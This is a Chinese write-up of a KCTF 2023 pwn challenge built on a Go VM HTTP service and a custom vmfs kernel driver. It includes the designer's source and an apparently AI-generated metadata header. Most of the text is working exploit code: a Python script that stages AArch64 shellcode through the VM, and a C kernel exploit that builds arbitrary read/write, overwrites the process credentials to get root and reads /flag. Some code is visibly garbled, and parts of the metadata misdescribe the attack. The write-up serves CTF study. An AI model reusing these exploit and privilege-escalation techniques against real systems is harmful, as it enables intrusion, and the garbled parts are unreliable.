---
title: 看雪2023 KCTF年度赛 | 第9题·突破防线-设计思路及解析
contest: 看雪2023 KCTF年度赛
year: 2023
difficulty: hard
vuln_type: kernel
tags:
- Go VM
- vmfs内核驱动
- IOCTL用户态通信
- 自定义VM指令
- sha512密码学
- cgo FFI
- http服务+VM执行
attack_chain: 上传代码到vmfs驱动→IOCTL 0xff00-0xff05(创建/移动/删除/读写/排序文件)→runFile/VM执行上传代码→sha512 blockGeneric+blockAsm→C/S混合VM→custom opcodes
key_payload: VMFS_CREATE_FILE=0xff00;VMFS_MOVE_TO_TRASH=0xff01;VMFS_DELETE_FROM_TRASH=0xff02;VMFS_WRITE_FILE=0xff03;VMFS_READ_FILE=0xff04;VMFS_SORT_FILE=0xff05;main_machine_0 reg[16]+_pc+code[4096]+data[]
one_liner: KCTF2023年度赛Q9《突破防线》Go VM+vmfs驱动+IOCTL通信+自定义指令VM+sha512
lesson: Go写的VM+内核驱动组合：cgo调用ioctl传递用户态buffer到内核VM执行
quality: high
full_path: 看雪2023_KCTF年度赛_-_第9题·突破防线-设计思路及解析.full.md
meta_path: 看雪2023_KCTF年度赛_-_第9题·突破防线-设计思路及解析.meta.md
images_removed: true
images_removed_count: 10
schema_version: v3.0.0-P0
summary: 看雪2023 KCTF年度赛 | 第9题·突破防线-设计思路及解析。KCTF2023年度赛Q9《突破防线》Go VM+vmfs驱动+IOCTL通信+自定义指令VM+sha512。经验：Go写的VM+内核驱动组合：cgo调用ioctl传递用户态buffer到内核VM执行
category: pwn
subcategory: kernel
tools_used:
- C
- Go
time_required: long
difficulty_score: 4
code_blocks_count: 2
images_count: 10
last_verified: 2026-09-20
contest_type: open
wp_url: https://www.ctfiot.com/136595.html
reasoning_chain:
- 用户上传代码到/dev/vmfs驱动 → 触发点：vmfs内核驱动+VM组合架构
- 假设：cgo通过ioctl把用户态buffer传到内核VM执行 → 动作：分析runFile函数syscall.Syscall参数
- 观察：VMFS_READ_FILE=0xff04 + user_argv{id,addr,size,choose_index} → 下一步：跟踪VM执行
- main_machine_0含reg[16]+pc+code[4096]+data → 假设：自定义指令集VM
- 动作：解析自定义opcode → 观察：cgo FFI跨C/S语言边界传递buffer
- 假设：sha512密码学原语做VM指令 → 动作：定位crypto_sha512 blockGeneric/blockAsm
- 观察：HTTP服务runFile()返回JSON结果 → 下一步：构造有效VM code上传执行
- 漏洞路径：上传恶意VM code → IOCTL装入vm.code → 启动VM执行 → 远程代码执行
failed_attempts:
- 试图跳过vmfs驱动直接调用VM → 失败：单独运行vm程序找不到驱动
- 试图用现成LLVM Pass框架 → 失败：本题是Go VM非LLVM
- 忽略cgo FFI边界只看user_argv结构 → 失败：漏掉unsafe.Pointer传递buffer的关键
key_observations:
- Go VM + 内核驱动组合非常规架构，cgo做用户态↔内核态通信
- IOCTL 0xff00-0xff05 是自定义vmfs的文件操作码
- main_machine_0结构（reg/pc/code/data）是自定义VM的标准设计
- sha512密码学原语提供强随机性可作为VM指令熵源
- HTTP服务runFile + JSON响应 = 服务端VM执行通道
prerequisites:
- Go语言VM设计基础（reg/pc/code/data四元组）
- cgo FFI机制（unsafe.Pointer + syscall.Syscall）
- Linux内核IOCTL驱动开发
- sha512算法原理及blockGeneric/blockAsm汇编实现
---
# 看雪2023 KCTF年度赛 | 第9题·突破防线-设计思路及解析

> 原文: https://www.ctfiot.com/136595.html
> ID: 136595

这是一场人类与超智能AI的“生死”较量

请立刻集结，搭乘SpaceX，前往AI控制空间站

智慧博弈  谁能问鼎

看雪·2023 KCTF 年度赛于9月1日中午12点正式开赛！比赛基本延续往届模式，设置了难度值、火力值和精致度积分。由此来引导竞赛的难度和趣味度，使其更具挑战性和吸引力，同时也为参赛选手提供了更加公平、有趣的竞赛平台。

*注意：签到题持续开放，整个比赛期间均可提交答案获得积分

今日中午12:
00第九题《突破防线》已截止答题，该题仅有1支战队成功提交flag，一起来看下该题的设计思路和解析吧。

出题团队简介

设计思路

# vmfs

## 功能

vm 中开启了一个 http 服务，该服务可以运行用户上传的代码，代码文件保存在 /dev/vmfs 驱动中，单独运行 vm 程序是无法执行代码的，因为程序无法找到驱动。

用户可以上传自己的代码，之后发送运行指令，使得代码在 vm 程序中执行，并返回执行得到的结果。

**用户态功能**：

**内核态功能**：

```c
    #define VMFS_CREATE_FILE 0xff00 // 创建文件节点
    #define VMFS_MOVE_TO_TRASH 0xff01 // 将文件节点移动到回收站
    #define VMFS_DELETE_FROM_TRASH 0xff02 // 彻底删除文件节点
    #define VMFS_WRITE_FILE 0xff03 // 写文件节点
    #define VMFS_READ_FILE 0xff04 // 读文件节点
    #define VMFS_SORT_FILE 0xff05 // 对文件节点进行排序

00000000 main_machine_0 struc ; (sizeof=0x80A0, align=0x8, copyof_2879)
00000000 ; XREF: main.runVM/r
00000000 ; main.runFile/r
00000000 reg DCQ 16 dup(?)
00000080 _pc DCQ ? ; XREF: main.runVM:
loc_1F96C8/r
00000080 ; main.runVM+88/r ...
00000088 code DCQ 4096 dup(?) ; XREF: main.runVM+24/o
00008088 data _slice_uint64 ?
000080A0 main_machine_0 ends

00000000 _slice_uint64 struc ; (sizeof=0x18, align=0x8, copyof_224)
00000000 ; XREF: .data:
crypto_sha512._K/r
00000000 ; main_machine_0/r ...
00000000 array DCQ ? ; XREF: crypto_sha512.blockGeneric+27C/r
00000000 ; crypto_sha512.blockAsm+10/r ; offset
00000008 len DCQ ? ; XREF: runtime._ptr_profBuf.write+38/w
00000008 ; runtime._ptr_profBuf.write+88/r ...
00000010 cap DCQ ? ; XREF: runtime._ptr_profBuf.write+4AC/w
00000010 ; runtime._ptr_profBuf.write+4D8/r ...
00000018 _slice_uint64 ends

func runFile(w http.ResponseWriter, r *http.Request) {
 w.Header().Set("Content-Type", "application/json")
 w.Header().Set("Access-Control-Allow-Origin", "*")

 var req Req
 err := json.NewDecoder(r.Body).Decode(&req)
 if err != nil {
 http.Error(w, err.Error(), http.StatusBadRequest)
 return
 }

 f, err := os.OpenFile(dev_path, syscall.O_RDONLY, 0600)
 if err != nil {
 http.Error(w, "Internal Server Error", http.StatusInternalServerError)
 return
 }

 var vm machine
 vm.data = make([]uint64, 0x1000)

 data := user_argv{
 id: uint64(req.Id),
 addr: uintptr(unsafe.Pointer(&(vm.code))),
 size: uint64(req.Size),
 choose_index: uint64(req.ChooseIndex),
 sort_option: uint64(0),
 }
 _, _, errno := syscall.Syscall(
 syscall.SYS_IOCTL,
 uintptr(f.Fd()),
 uintptr(VMFS_READ_FILE),
 uintptr(unsafe.Pointer(&data)),
 )

 f.Close()

 if errno != 0 {
 http.Error(w, "Internal Server Error", http.StatusInternalServerError)
 return
 }

 message := VmMessage{
 Text: "success",
 Return: runVM(vm),
 }

 response, err := json.Marshal(message)
 if err != nil {
 http.Error(w, "Internal Server Error", http.StatusInternalServerError)
 return
 }

 w.Write(response)
}

func createFile(w http.ResponseWriter, r *http.Request) {
 w.Header().Set("Content-Type", "application/json")
 w.Header().Set("Access-Control-Allow-Origin", "*")

 var req Req
 err := json.NewDecoder(r.Body).Decode(&req)
 if err != nil {
 http.Error(w, err.Error(), http.StatusBadRequest)
 return
 }
 if req.Size > 0x1000 * 8 {
 http.Error(w, "Internal Server Error", http.StatusInternalServerError)
 return
 }
 ...
}

static int struct_initial(void)
{
 int i;
 struct node *tmp = NULL;

 for (i = 0; i < LENGTH; i++)
 {
 list[i] = NULL;
 trash[i].id = NONE;
 trash[i].freed = NULL;
 }

 tmp = (struct node *)kmalloc(sizeof(struct node), GFP_KERNEL);
 if(!tmp)
 {
 return NONE;
 }
 memset(tmp, 0, sizeof(struct node));
 tmp->id = 0x636db8c2;
 tmp->msg_len = 0x10000;
 tmp->msg = (char *)kmalloc(0x10000, GFP_KERNEL);
 if(!(tmp->msg))
 {
 return NONE;
 }

 memset(tmp->msg, 0, 0x10000);

 list[0] = tmp;

 return 0;
}

func runVM(vm machine)(r uint64){
 r = 0xdeadbeef
 end:
 for vm.pc < 0x1000 {
 switch vm.code[vm.pc] {
 case 0:
 break end
 case 1:
 if vm.code[vm.pc + 1] >= 16 || vm.code[vm.pc + 2] >= 16{
 return
 }
 vm.reg[vm.code[vm.pc + 1]] += vm.reg[vm.code[vm.pc + 2]]
 vm.pc += 3
 case 2:
 if vm.code[vm.pc + 1] >= 16 || vm.code[vm.pc + 2] >= 16{
 return
 }
 vm.reg[vm.code[vm.pc + 1]] -= vm.reg[vm.code[vm.pc + 2]]
 vm.pc += 3
 case 3:
 if vm.code[vm.pc + 1] >= 16 || vm.code[vm.pc + 2] >= 16{
 return
 }
 vm.reg[vm.code[vm.pc + 1]] *= vm.reg[vm.code[vm.pc + 2]]
 vm.pc += 3
 case 4:
 if vm.code[vm.pc + 1] >= 16 || vm.code[vm.pc + 2] >= 16{
 return
 }
 vm.reg[vm.code[vm.pc + 1]] /= vm.reg[vm.code[vm.pc + 2]]
 vm.pc += 3
 case 5:
 if vm.code[vm.pc + 1] >= 16 {
 return
 }
 vm.reg[vm.code[vm.pc + 1]] = vm.code[vm.pc + 2]
 vm.pc += 3
 case 6:
 if vm.code[vm.pc + 1] >= 16 || vm.code[vm.pc + 2] >= uint64(len(vm.data)) {
 return
 }
 vm.reg[vm.code[vm.pc + 1]] = vm.data[vm.code[vm.pc + 2]]
 vm.pc += 3
 case 7:
 if vm.code[vm.pc + 1] >= uint64(len(vm.data)) || vm.code[vm.pc + 2] >= 16 {
 return
 }
 vm.data[vm.code[vm.pc + 1]] = vm.reg[vm.code[vm.pc + 2]]
 vm.pc += 3
 case 8:
 if vm.code[vm.pc + 1] >= 16 || vm.code[vm.pc + 2] >= 16 || vm.reg[vm.code[vm.pc + 2]] >= uint64(len(vm.data)) {
 return
 }
 vm.reg[vm.code[vm.pc + 1]] = vm.data[vm.reg[vm.code[vm.pc + 2]]]
 vm.pc += 3
 case 9:
 if vm.code[vm.pc + 1] >= 16 || vm.code[vm.pc + 2] >= 16 || vm.reg[vm.code[vm.pc + 1]] >= uint64(len(vm.data)) {
 return
 }
 vm.data[vm.reg[vm.code[vm.pc + 1]]] = vm.reg[vm.code[vm.pc + 2]]
 vm.pc += 3
 default:
 return
 }
 }
 r = vm.reg[0]
 return
}

line CODE JT JF K
=================================
 0000: 0x20 0x00 0x00 0x00000004 A = arch
 0001: 0x15 0x00 0x04 0xc00000b7 if (A != ARCH_AARCH64) goto 0006
 0002: 0x20 0x00 0x00 0x00000000 A = sys_number
 0003: 0x15 0x02 0x00 0x00000142 if (A == execveat) goto 0006
 0004: 0x15 0x01 0x00 0x0000003b if (A == execve) goto 0006
 0005: 0x06 0x00 0x00 0x7fff0000 return ALLOW
 0006: 0x06 0x00 0x00 0x00000000 return KILL

# user

def req(api, data):
 json_str = json.dumps(data)
 sh.send((
f'''POST {api} HTTP/1.1
Host: {host}:{port}
Accept: */*
Connection: keep-alive
Content-Length: {len(json_str)}
Content-Type: application/json

'''.replace('n', 'rn') + json_str).encode())

vm_code = []
def write(address, value):
 global vm_code
 vm_code += [5, 0, value]
 vm_code += [7, address//8, 0]
write(0x498f10, 0x68732f6e69622f)
write(0x498f00, 0x498f10)

shellcode = asm(
'''

mov x8, 220
mov x0, 19
mov x1, 0
svc 0 ;// fork

cmp x0, 0

bne over

;// child

mov x8, 24
mov x0, 4
mov x1, 0
mov x2, 0
svc 0 ;// dup3(4, 0, 0)

mov x8, 24
mov x0, 1
mov x1, 4
mov x2, 0
svc 0 ;// dup3(1, 4, 0)

mov x8, 24
mov x0, 0
mov x1, 1
mov x2, 0
svc 0 ;// dup3(0, 1, 0)

mov x8, 24
mov x0, 0
mov x1, 2
mov x2, 0
svc 0 ;// dup3(0, 2, 0)

mov x8, 25
mov x0, 0
mov x1, 4
mov x2, 0
svc 0 ;// fcntl(0, F_SETFL, 0)

str x0, [sp, 0]
mov x0, 0
mov x1, sp
mov x2, 8
mov x8, 64
svc 0

mov x8, 63
mov x0, 0
adr x1, 12
mov x2, 0x800
svc 0 ;// read(0, shellcode, 0x800)

shellcode:

over:
mov x8, 172
svc 0 ;// getpid

mov x8, 129
mov x1, 19
svc 0 ;// kill(self, SIGSTOP)

''')

shellcode_i = 0
while(shellcode):
 tmp = shellcode[:8].ljust(8, b' ')
 shellcode = shellcode[8:]
 write(0x498000 + shellcode_i, u64(tmp))
 shellcode_i += 8

stack_list = [0x400011b000, 0x400012b000, 0x4000187000]
for stack_addr in stack_list:
 write(stack_addr+0x820, 0x12808)

 write(stack_addr+0x840, 0x498000)

 write(stack_addr+0x860, 7)
 write(stack_addr+0x858, 0x1000)
 write(stack_addr+0x850, 0x498000)
 write(stack_addr+0x848, 226)

payload = {"Id":
0x636db8c2, "ChooseIndex":0, "Size": 0x8018, "Data":
vm_code + [0] * (0x1000 - len(vm_code)) + [0, 0x7fffffffffffffff, 0x7fffffffffffffff]}
req('/api/write-file', payload)
payload = {"Id":
0x636db8c2, "ChooseIndex":0, "Size": 0x8018}
req('/api/run-file', payload)

sh.recvuntil(b' ' * 8)

static ssize_t vmfs_ioctl(struct file *file, unsigned int cmd, size_t arg)
{
 struct user_argv argv;
 size_t result = 0;

 mutex_lock(&vmfs_lock);

 if(result == 0 && copy_from_user(&argv, (void *)arg, sizeof(argv)))
 {
 result = -1;
 }

 if(result == 0 && argv.id == NONE)
 {
 result = -1;
 }

 if(result == 0)
 {
 switch (cmd)
 {
 case VMFS_CREATE_FILE:
 if(result == 0 && add(argv.size, argv.id))
 {
 result = -1;
 }
 break;
 case VMFS_MOVE_TO_TRASH:
 if(result == 0 && move_to_trash(argv.id, argv.choose_index))
 {
 result = -1;
 }
 break;
 case VMFS_DELETE_FROM_TRASH:
 if(result == 0 && delete_from_trash(argv.id, argv.choose_index))
 {
 result = -1;
 }
 break;
 case VMFS_WRITE_FILE:
 if(result == 0 && write_file(argv.id, argv.addr, argv.size, argv.choose_index))
 {
 result = -1;
 }
 break;
 case VMFS_READ_FILE:
 if(result == 0 && read_file(argv.id, argv.addr, argv.size, argv.choose_index))
 {
 result = -1;
 }
 break;
 case VMFS_SORT_FILE:
 switch (argv.sort_option)
 {
 case VMFS_BUBBLE_SORT:
 bubble_sort();
 break;
 case VMFS_INSERT_SORT:
 insert_sort();
 break;
 case VMFS_SELECTION_SORT:
 selection_sort();
 break;
 case VMFS_MERGE_SORT:
 merge_sort();
 break;
 default:
 result = -1;
 break;
 }
 break;
 default:
 result = -1;
 break;
 }
 }

 mutex_unlock(&vmfs_lock);

 return result;
}

5* 5 2

2 5 5*

    #ifdef CONFIG_HARDENED_USERCOPY
/*
 * Rejects incorrectly sized objects and objects that are to be copied
 * to/from userspace but do not fall entirely within the containing slab
 * cache's usercopy region.
 *
 * Returns NULL if check passes, otherwise const char * to name of cache
 * to indicate an error.
 */
void __check_heap_object(const void *ptr, unsigned long n,
 const struct slab *slab, bool to_user)
{
 struct kmem_cache *s;
 unsigned int offset;
 bool is_kfence = is_kfence_address(ptr);

 ptr = kasan_reset_tag(ptr);

 /* Find object and usable object size. */
 s = slab->slab_cache;

 /* Reject impossible pointers. */
 if (ptr < slab_address(slab))
 usercopy_abort("SLUB object not in SLUB page?!", NULL,
 to_user, 0, n);

 /* Find offset within object. */
 if (is_kfence)
 offset = ptr - kfence_object_start(ptr);
 else
 offset = (ptr - slab_address(slab)) % s->size;

 /* Adjust for redzone and reject if within the redzone. */
 if (!is_kfence && kmem_cache_debug_flags(s, SLAB_RED_ZONE)) {
 if (offset < s->red_left_pad)
 usercopy_abort("SLUB object in left red zone",
 s->name, to_user, offset, n);
 offset -= s->red_left_pad;
 }

 /* Allow address range falling entirely within usercopy region. */
 if (offset >= s->useroffset &&
 offset - s->useroffset <= s->usersize &&
 n <= s->useroffset - offset + s->usersize)
 return;

 usercopy_abort("SLUB object", s->name, to_user, offset, n);
}
    #endif /* CONFIG_HARDENED_USERCOPY */

static inline void check_heap_object(const void *ptr, unsigned long n,
 bool to_user)
{
 unsigned long addr = (unsigned long)ptr;
 unsigned long offset;
 struct folio *folio;

 if (is_kmap_addr(ptr)) {
 offset = offset_in_page(ptr);
 if (n > PAGE_SIZE - offset)
 usercopy_abort("kmap", NULL, to_user, offset, n);
 return;
 }

 if (is_vmalloc_addr(ptr) && !pagefault_disabled()) {
 struct vmap_area *area = find_vmap_area(addr);

 if (!area)
 usercopy_abort("vmalloc", "no area", to_user, 0, n);

 if (n > area->va_end - addr) {
 offset = addr - area->va_start;
 usercopy_abort("vmalloc", NULL, to_user, offset, n);
 }
 return;
 }

 if (!virt_addr_valid(ptr))
 return;

 folio = virt_to_folio(ptr);

 if (folio_test_slab(folio)) {
 /* Check slab allocator for flags and size. */
 __check_heap_object(ptr, n, folio_slab(folio), to_user);
 } else if (folio_test_large(folio)) {
 offset = ptr - folio_address(folio);
 if (n > folio_size(folio) - offset)
 usercopy_abort("page alloc", NULL, to_user, offset, n);
 }
}

int pfn_is_map_memory(unsigned long pfn)
{
 phys_addr_t addr = PFN_PHYS(pfn);

 /* avoid false positives for bogus PFNs, see comment in pfn_valid() */
 if (PHYS_PFN(addr) != pfn)
 return 0;

 return memblock_is_map_memory(addr);
}

bool __init_memblock memblock_is_map_memory(phys_addr_t addr)
{
 int i = memblock_search(&memblock.memory, addr);

 if (i == -1)
 return false;
 return !memblock_is_nomap(&memblock.memory.regions[i]);
}

static inline bool memblock_is_nomap(struct memblock_region *m)
{
 return m->flags & MEMBLOCK_NOMAP;
}

enum memblock_flags {MEMBLOCK_NONE, MEMBLOCK_HOTPLUG, MEMBLOCK_MIRROR, MEMBLOCK_NOMAP = 4, MEMBLOCK_DRIVER_MANAGED = 8}

memblock_memory_init_regions[0].flags = MEMBLOCK_NOMAP

    #define _GNU_SOURCE
    #include <stdio.h>
    #include <stdlib.h>
    #include <string.h>
    #include 
    #include <fcntl.h>
    #include <signal.h>
    #include <sys/wait.h>
    #include <sys/ioctl.h>

    #define VMFS_CREATE_FILE 0xff00
    #define VMFS_MOVE_TO_TRASH 0xff01
    #define VMFS_DELETE_FROM_TRASH 0xff02
    #define VMFS_WRITE_FILE 0xff03
    #define VMFS_READ_FILE 0xff04
    #define VMFS_SORT_FILE 0xff05

    #define VMFS_BUBBLE_SORT 1
    #define VMFS_INSERT_SORT 2
    #define VMFS_SELECTION_SORT 3
    #define VMFS_MERGE_SORT 4

struct user_argv
{
 size_t id;
 char *addr;
 size_t size;
 size_t choose_index;
 size_t sort_option;
};

struct node
{
 size_t id;
 size_t msg_len;
 char *msg;
};

int vmfs_fd = 0;
size_t kernel_base_addr = 0;
    #define REAL(addr) (kernel_base_addr - 0xffff800008000000 + (addr))
    #define INIT_TASK 0xffff800009ee4200

int leak()
{
 struct user_argv argv;
 char buf[0x100];

 memset(&argv, 0, sizeof(argv));
 argv.id = 0x7352eda5;
 argv.size = 0x200;
 ioctl(vmfs_fd, VMFS_CREATE_FILE, &argv);

 memset(&argv, 0, sizeof(argv));
 argv.id = 0x7352eda5;
 argv.size = 0x200;
 ioctl(vmfs_fd, VMFS_CREATE_FILE, &argv);

 memset(&argv, 0, sizeof(argv));
 argv.id = 0x7352eda0;
 argv.size = 0x200;
 ioctl(vmfs_fd, VMFS_CREATE_FILE, &argv);

 memset(&argv, 0, sizeof(argv));
 argv.id = 0x7352eda5;
 argv.choose_index = 0;
 ioctl(vmfs_fd, VMFS_MOVE_TO_TRASH, &argv);

 open("/dev/ptmx", O_RDONLY);

 memset(&argv, 0, sizeof(argv));
 argv.sort_option = VMFS_SELECTION_SORT;
 ioctl(vmfs_fd, VMFS_SORT_FILE, &argv);

 memset(&argv, 0, sizeof(argv));
 memset(&buf, 0, sizeof(buf));
 argv.id = 0x7352eda5;
 argv.size = 0x100;
 argv.addr = buf;
 argv.choose_index = 1;
 ioctl(vmfs_fd, VMFS_READ_FILE, &argv);
 kernel_base_addr = *(size_t*)(buf + 0x20) - 0x7b6270;
 printf("kernel_base_addr: %#lxn", kernel_base_addr);

 return 0;
}

int construct_arbitrary_read_write()
{
 struct user_argv argv;

 memset(&argv, 0, sizeof(argv));
 argv.id = 0x796041b5;
 argv.size = 0x20;
 ioctl(vmfs_fd, VMFS_CREATE_FILE, &argv);

 memset(&argv, 0, sizeof(argv));
 argv.id = 0x796041b5;
 argv.size = 0x20;
 ioctl(vmfs_fd, VMFS_CREATE_FILE, &argv);

 memset(&argv, 0, sizeof(argv));
 argv.id = 0x796041b0;
 argv.size = 0x20;
 ioctl(vmfs_fd, VMFS_CREATE_FILE, &argv);

 memset(&argv, 0, sizeof(argv));
 argv.id = 0x796041b5;
 argv.choose_index = 0;
 ioctl(vmfs_fd, VMFS_MOVE_TO_TRASH, &argv);

 memset(&argv, 0, sizeof(argv));
 argv.sort_option = VMFS_SELECTION_SORT;
 ioctl(vmfs_fd, VMFS_SORT_FILE, &argv);

 memset(&argv, 0, sizeof(argv));
 argv.id = 0x796041b6;
 argv.size = 0x200;
 ioctl(vmfs_fd, VMFS_CREATE_FILE, &argv);

 return 0;
}

int arbitrary_read(size_t dst, void *out_buf, size_t length)
{
 struct user_argv argv;
 char buf[0x100];
 struct node *nptr;

 memset(&argv, 0, sizeof(argv));
 memset(&argv, 0, sizeof(argv));
 argv.id = 0x796041b5;
 argv.size = 0x20;
 argv.addr = buf;
 argv.choose_index = 1;
 memset(buf, 0, sizeof(buf));
 nptr = (struct node *)buf;
 nptr->id = 0x796041b6;
 nptr->msg_len = length;
 nptr->msg = (char *)(dst);
 ioctl(vmfs_fd, VMFS_WRITE_FILE, &argv);

 memset(&argv, 0, sizeof(argv));
 argv.id = 0x796041b6;
 argv.size = length;
 argv.addr = out_buf;
 argv.choose_index = 0;
 ioctl(vmfs_fd, VMFS_READ_FILE, &argv);

 return 0;
}

int arbitrary_write(size_t dst, void *in_buf, size_t length)
{
 struct user_argv argv;
 char buf[0x100];
 struct node *nptr;

 memset(&argv, 0, sizeof(argv));
 memset(&argv, 0, sizeof(argv));
 argv.id = 0x796041b5;
 argv.size = 0x20;
 argv.addr = buf;
 argv.choose_index = 1;
 memset(buf, 0, sizeof(buf));
 nptr = (struct node *)buf;
 nptr->id = 0x796041b6;
 nptr->msg_len = length;
 nptr->msg = (char *)(dst);
 ioctl(vmfs_fd, VMFS_WRITE_FILE, &argv);

 memset(&argv, 0, sizeof(argv));
 argv.id = 0x796041b6;
 argv.size = length;
 argv.addr = in_buf;
 argv.choose_index = 0;
 ioctl(vmfs_fd, VMFS_WRITE_FILE, &argv);

 return 0;
}

size_t get_current_task()
{
 size_t init_task = REAL(INIT_TASK), task = init_task;
 size_t result = 0;
 size_t name = 0;
 size_t out_result;
 int i = 0;

 #define NAME_OFFSET 0x680
 #define TASK_OFFSET 0x3a8

 while(result == 0 && i++ < 8)
 {
 out_result = 0;
 arbitrary_read(task + TASK_OFFSET + 8, &out_result, sizeof(out_result)) - TASK_OFFSET;
 task = out_result - TASK_OFFSET;
 printf("task: %#llxn", task);
 if(task == init_task)
 {
 break;
 }
 name = 0;
 arbitrary_read(task + NAME_OFFSET, &name, sizeof(name));
 printf("name: %sn", (char *)&name);
 if((name & 0xffff) == 0x6d76) // "vm"
 {
 result = task;
 }
 }

 return result;
}

int modify_current_cred()
{
 size_t current_task = 0;
 size_t value = 0;
 size_t current_cred = 0;
 int memblock_memory_init_regions_0_flag = 4;
 char buf[0x20];

 arbitrary_write(REAL(0xffff80000a2b31f8), &memblock_memory_init_regions_0_flag, sizeof(memblock_memory_init_regions_0_flag)); // memblock_memory_init_regions[0].flags

 current_task = get_current_task();
 if(current_task == 0)
 {
 fprintf(stderr, "Error: Not found current_taskn");
 kill(-1, SIGKILL);
 exit(EXIT_FAILURE);
 }
 printf("current_task: %#lxn", current_task);

 arbitrary_read(current_task + 0x668, ¤t_cred, sizeof(current_cred));
 printf("current_cred: %#lxn", current_cred);

 memset(buf, 0, sizeof(0));
 arbitrary_write(current_cred + 4, buf, sizeof(buf));

 printf("uid: %dn", getuid());

 return 0;
}

int readflag()
{
 int fd = 0;
 char buf[0x100];
 int result;

 setuid(0);

 fd = open("/flag", O_RDONLY);
 if(fd == -1)
 {
 perror("open");
 exit(EXIT_FAILURE);
 }

 memset(buf, 0, sizeof(buf));

 result = read(fd, buf, sizeof(buf)-1);
 printf("result: %dn", result);

 write(STDOUT_FILENO, buf, result);

 close(fd);

 return 0;
}

int main()
{
 setbuf(stdout, NULL);

 vmfs_fd = open("/dev/vmfs", O_RDONLY);
 if(vmfs_fd == -1)
 {
 perror("open");
 exit(EXIT_FAILURE);
 }

 leak();

 construct_arbitrary_read_write();

 modify_current_cred();

 readflag();

 return 0;
}

赛题解析

本题解析由看雪大牛 c10v3r 提供：

后面两段主要是逆向和内核两位大手子写的。

本题叠buf式的考点让几位师傅隔着各种远程投屏互相帮忙调了几个通宵，无数次都在祈求出题人收了神通，不过最后还是做出来了。没打过内核，当时并不觉得把静态c程序exp改成shellcode可以很有可行性，随口提了一句，结果几位大爹说还真可以，属于歪打正着了，最后和IChild大爷被几个socket调用调戏了一通宵到精神恍惚。不知道是否有能在禁止execve/at的情况下更为精妙的可行思路。

大体流程：

1.利用用户态漏洞进行 rop 和布置 shellcode-seg1
2. rop 利用 mprotect 调用成功运行小段 shellcode-seg1
3.在 shellcode-seg1 中用 socket 操作读入大段 shellcode-seg2 （这段直接来自于打内核的 exp binary），并完成场景还原和跳转
4.跳转运行 shellcode-seg2 完成内核漏洞的利用（精神污染），篡改 busybox 的 poweroff 逻辑
5.杀 vm 进程，在防止内核崩掉（需要一点处理）的情况下让 init 高权限顺序执行 poweroff ，利用 8080 端口反弹信息。

用户态程序 vm 是 go 语言写的，在插件的帮助下顺利恢复函数名，再手动恢复下自定义结构体的信息就能得到程序逻辑。

void __cdecl main_main()
{
 __int64 v0; // x28
 _QWORD *http_server; // x0
 __int64 v2; // x0
 __int64 v3; // x1
 __int64 v4; // x0
 void *server_handle; // [xsp+38h] [xbp-40h]
 __int64 v6[2]; // [xsp+40h] [xbp-38h] BYREF
 _QWORD v7[4]; // [xsp+50h] [xbp-28h] BYREF
 __int64 v8; // [xsp+78h] [xbp+0h] BYREF

 if ( (unsigned __int64)&v8 <= *(_QWORD *)(v0 + 16) )
 runtime_morestack_noctxt();
 main_initFs();
 v6[0] = (__int64)&type_string;
 v6[1] = (__int64)&off_2D7E60;
 fmt_Fprintln(&off_2D8F98, qword_45C3E8, v6, 1LL, 1LL);// "Server started ..."
 server_handle = runtime_newobject(&type_http_ServeMux);
 net_http___ServeMux__Handle(server_handle, aApiCreateFile, 16LL, &off_2D9438, off_293378);// 0x1F9A90, main.createFile
 net_http___ServeMux__Handle(server_handle, aApiWriteFile, 15LL, &off_2D9438, &off_293388);// 0x1F9E70, main.writeFile
 net_http___ServeMux__Handle(server_handle, aApiRunFile, 13LL, &off_2D9438, off_293380);// 0x1FA260, main.runFile
 http_server = runtime_newobject(&type_http_Server);
 http_server[1] = 5LL;
 *http_server = a8080;
 http_server[2] = &off_2D8E18;
 if ( dword_4927C0 )
 runtime_gcWriteBarrier(http_server + 3, server_handle);
 else
 http_server[3] = server_handle;
 v2 = net_http___Server__ListenAndServe(http_server);
 if ( v2 )
 {
 v7[2] = 0LL;
 v7[3] = 0LL;
 v7[0] = &type_string;
 v7[1] = &off_2D7E80;
 v4 = *(_QWORD *)(v2 + 8);
 v7[2] = v4;
 v7[3] = v3;
 fmt_Fprintln(&off_2D8F98, qword_45C3E8, v7, 2LL, 2LL);// "Error starting the server:"
 }
}

void __fastcall main_initFs()
{
 __int64 v0; // x28
 __int64 v1[2]; // [xsp+30h] [xbp-58h] BYREF
 __int64 v2[9]; // [xsp+40h] [xbp-48h] BYREF
 __int64 v3; // [xsp+88h] [xbp+0h] BYREF

 if ( (unsigned __int64)&v3 <= *(_QWORD *)(v0 + 16) )
 runtime_morestack_noctxt();
 v2[0] = 0x400000020LL;
 v2[1] = 0xC00000B704000015LL;
 v2[2] = 32LL;
 v2[3] = 0x11900020015LL;
 v2[4] = 0xDD00010015LL;
 v2[5] = 0x7FFF000000000006LL;
 v2[6] = 6LL;
 v1[0] = 7LL;
 v1[1] = (__int64)v2;
 syscall_Syscall(SYS_prctl, PR_SET_NO_NEW_PRIVS, 1LL);
 v2[7] = (__int64)v1;
 syscall_Syscall(SYS_prctl, PR_SET_SECCOMP, 2LL, v1);
}

void __fastcall main_createFile(ResponseWriter_table *Response_vtable, void *response, void *request)
{
 // [COLLAPSED LOCAL DECLARATIONS. PRESS KEYPAD CTRL-"+" TO EXPAND]

 if ( (unsigned __int64)&v31 <= *(_QWORD *)(v3 + 16) )
 runtime_morestack_noctxt();
 v30 = Response_vtable->net_http_(_response)_Header(response);
 *(_OWORD *)v4 = net_textproto_CanonicalMIMEHeaderKey(aContentType, 12LL);
 v35 = v4[0];
 value = runtime_newobject(&type_string_array_1_ptr);
 *((_QWORD *)value + 1) = 16LL;
 *(_QWORD *)value = aApplicationJso;
 v6 = (void **)runtime_mapassign_faststr(&type_textproto_MIMEHeader, v30, v35, v4[1]);
 v6[1] = (void *)1;
 v6[2] = (void *)1;
 if ( dword_4927C0 )
 runtime_gcWriteBarrier(v6, value);
 else
 *v6 = value;
 v29 = Response_vtable->net_http_(_response)_Header(response);
 *(_OWORD *)v7 = net_textproto_CanonicalMIMEHeaderKey(aAccessControlA_3, 27LL);
 v35 = v7[0];
 v8 = runtime_newobject(&type_string_array_1_ptr);
 v33 = v8;
 v8[1] = 1LL;
 *v8 = "*";
 v9 = (void **)runtime_mapassign_faststr(&type_textproto_MIMEHeader, v29, v35, v7[1]);
 v9[1] = (void *)1;
 v9[2] = (void *)1;
 if ( dword_4927C0 )
 runtime_gcWriteBarrier(v9, v33);
 else
 *v9 = v33;
 v37 = (main::
Req *)runtime_newobject(&type_main_Req);
